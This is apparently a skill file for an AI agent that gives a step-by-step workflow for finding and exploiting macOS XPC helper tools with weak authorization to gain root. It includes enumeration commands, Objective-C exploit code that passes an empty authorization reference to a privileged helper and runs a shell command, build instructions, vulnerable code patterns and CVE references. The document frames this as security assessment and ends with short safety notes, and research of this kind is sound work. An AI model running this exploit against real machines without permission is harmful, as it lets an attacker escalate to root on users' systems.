---
name: macos-xpc-authorization
description: macOS XPC Authorization Analysis and Exploitation. Use this skill whenever investigating macOS privilege escalation, analyzing XPC helper tools, enumerating authorization rights in /var/db/auth.db, or developing exploits for vulnerable XPC services. Trigger this when the user mentions XPC, HelperTool, authorization rights, privilege escalation on macOS, or any macOS security assessment involving inter-process communication.
---

# macOS XPC Authorization Analysis

A skill for analyzing and exploiting macOS XPC (Inter-Process Communication) authorization vulnerabilities for privilege escalation.

## Overview

XPC services are commonly used by macOS applications to perform privileged operations. HelperTools run as root and expose methods that applications can call. Authorization controls determine who can call these methods. Misconfigurations can lead to local privilege escalation.

## Workflow

### 1. Identify XPC HelperTools

Find installed privileged helper tools:

```bash
# List all privileged helper tools
ls -la /Library/PrivilegedHelperTools/

# Check LaunchDaemons for XPC services
ls -la /Library/LaunchDaemons/

# Find Mach services in plists
grep -r "MachServices" /Library/LaunchDaemons/*.plist
```

### 2. Enumerate Authorization Rights

Check `/var/db/auth.db` for authorization rules:

```bash
# List all authorization rules
sudo sqlite3 /var/db/auth.db "SELECT name FROM rules;"

# Search for specific service rules
sudo sqlite3 /var/db/auth.db "SELECT name FROM rules WHERE name LIKE '%helper%';"

# Read specific authorization right
security authorizationdb read com.example.HelperTool.right
```

Use the `enumerate_auth_rights.sh` script to find permissive rights automatically.

### 3. Identify Permissive Authorization Rules

These combinations allow access without user interaction:

| Key | Value | Meaning |
|-----|-------|---------|
| `authenticate-user` | `false` | No authentication required |
| `allow-root` | `true` | Root can access without auth |
| `session-owner` | `true` | Session owner auto-authorized |
| `shared` | `true` | Right can be shared (needs initial auth) |

**Critical patterns to find:**
- `authenticate-user: false` + `is-admin` or `is-session-owner`
- `allow-root: true` (if you can get root context)
- `session-owner: true` (current user auto-authorized)

### 4. Reverse the XPC Service

#### Find the Protocol Definition

Use `class-dump` to extract the protocol:

```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
```

Look for the `@protocol` definition showing available methods.

#### Find the Mach Service Name

Check these locations:

```bash
# From LaunchDaemon plist
cat /Library/LaunchDaemons/com.example.HelperTool.plist | grep -A5 MachServices

# From binary (using otool or lldb)
otool -l /Library/PrivilegedHelperTools/com.example.HelperTool | grep -i mach
```

#### Check Authorization Implementation

Look for these patterns in the HelperTool binary:

```bash
# Check if using EvenBetterAuthorization pattern
strings /Library/PrivilegedHelperTools/com.example.HelperTool | grep -i "checkAuthorization"
strings /Library/PrivilegedHelperTools/com.example.HelperTool | grep -i "AuthorizationCopyRights"
strings /Library/PrivilegedHelperTools/com.example.HelperTool | grep -i "shouldAcceptNewConnection"
```

**Vulnerable patterns:**
- `shouldAcceptNewConnection` always returns `YES` without code signature verification
- `AuthorizationCopyRights(NULL, ...)` - accepts any 32-byte blob
- Missing `setCodeSigningRequirement:` on the listener

### 5. Develop the Exploit

#### Create Authorization Reference

```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

AuthorizationRef authRef;
AuthorizationExternalForm authForm;
OSStatus status;

// Create empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, 
                            kAuthorizationFlagDefaults, &authRef);

// Convert to external form
status = AuthorizationMakeExternalForm(authRef, &authForm);

// Convert to NSData for XPC
NSData *authData = [[NSData alloc] initWithBytes:&authForm 
                                          length:sizeof(authForm)];
```

#### Connect to XPC Service

```objectivec
// Define the protocol (match what you found with class-dump)
@protocol HelperToolProtocol
- (void)executeCommandWithAuthorization:(NSData *)authData 
                                command:(NSString *)cmd 
                                  reply:(void (^)(NSError *))callback;
@end

// Connect to the service
NSString *serviceName = @"com.example.HelperTool";
NSXPCConnection *connection = [[NSXPCConnection alloc] 
    initWithMachServiceName:serviceName 
                     options:NSXPCConnectionPrivileged];

NSXPCInterface *interface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
[connection setRemoteObjectInterface:interface];
[connection resume];

id remoteProxy = [connection remoteObjectProxyWithErrorHandler:^(NSError *error) {
    NSLog(@"Connection error: %@", error);
}];
```

#### Call Privileged Method

```objectivec
// Call the method with your authorization data
[remoteProxy executeCommandWithAuthorization:authData 
                                    command:@"/bin/sh -c 'id'" 
                                      reply:^(NSError *error) {
    if (error) {
        NSLog(@"Method call failed: %@", error);
    } else {
        NSLog(@"Success!");
    }
}];

// Keep the process alive
[NSThread sleepForTimeInterval:5.0];
```

### 6. Compile and Run

```bash
gcc -framework Foundation -framework Security exploit.m -o exploit
./exploit
```

## Common Vulnerable Patterns

### Pattern 1: NULL AuthorizationRef

```objectivec
// Vulnerable - accepts any 32-byte blob
err = AuthorizationCopyRights(NULL, &rights, NULL, flags, NULL);
```

**Exploit:** Send any 32-byte data as authData.

### Pattern 2: Missing Code Signature Check

```objectivec
// Vulnerable - no code signature verification
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
    return YES;  // Always accepts!
}
```

**Exploit:** Connect without proper code signing.

### Pattern 3: Permissive Authorization Rules

```json
{
  "class": "allow",
  "version": 1,
  "allow-root": true,
  "authenticate-user": false
}
```

**Exploit:** Use empty authorization reference.

## Known CVEs for Reference

| CVE | Product | Vulnerability |
|-----|---------|---------------|
| CVE-2025-65842 | Acustica Audio Aquarius | NULL AuthorizationCopyRights + command injection |
| CVE-2025-55076 | Plugin Alliance InstallationHelper | NULL AuthorizationCopyRights + system() injection |
| CVE-2024-4395 | Jamf Compliance Editor | No authorization verification |
| CVE-2025-25251 | FortiClient Mac | Trusted own AuthorizationRef |

## Quick Triage Checklist

- [ ] List all HelperTools in `/Library/PrivilegedHelperTools/`
- [ ] Check LaunchDaemons for MachServices entries
- [ ] Run `enumerate_auth_rights.sh` to find permissive rules
- [ ] Use `class-dump` on each HelperTool to get protocol
- [ ] Check for `checkAuthorization` function in binary
- [ ] Look for `AuthorizationCopyRights(NULL, ...)` pattern
- [ ] Verify if `shouldAcceptNewConnection` checks code signature
- [ ] Test with empty authorization reference

## Tools

- `class-dump` - Extract protocol definitions
- `sqlite3` - Query auth.db
- `security authorizationdb` - Read authorization rights
- `codesign` - Check code requirements
- `otool` / `strings` - Binary analysis
- `lldb` - Dynamic debugging

## Safety Notes

- Always have proper authorization before testing
- Document findings for responsible disclosure
- Some exploits may crash the system or trigger security alerts
- Test in isolated environments when possible
